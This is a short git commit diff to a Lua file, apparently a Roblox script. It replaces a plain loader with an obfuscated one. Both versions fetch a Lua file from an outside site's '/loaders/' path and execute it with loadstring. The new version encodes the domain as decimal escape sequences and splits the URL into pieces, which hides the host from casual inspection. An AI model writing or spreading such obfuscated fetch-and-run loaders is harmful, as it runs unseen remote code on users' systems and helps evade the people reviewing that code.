88fa579ff7b67699c5962055f11aa1576af5088a
1kukukeke12-oss <1kukukeke12@gmail.com>
2026-05-26 22:48:22 -0400

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,1 +1,6 @@
-loadstring(game:HttpGet("https://eternal-darkness.org/loaders/88e07dc7d0dfd278e18dfe9693735fa5.lua"))()
+local a = "\104\116\116\112\115\58\47\47\101\116\101\114\110\97\108\45\100\97\114\107\110\101\115\115\46\111\114\103"
+local b = "/loaders/"
+local c = "0b7ba986a78f1c61156d36ff9efaaa0a"
+local d = ".lua"
+
+loadstring(game:HttpGet(a .. b .. c .. d))()
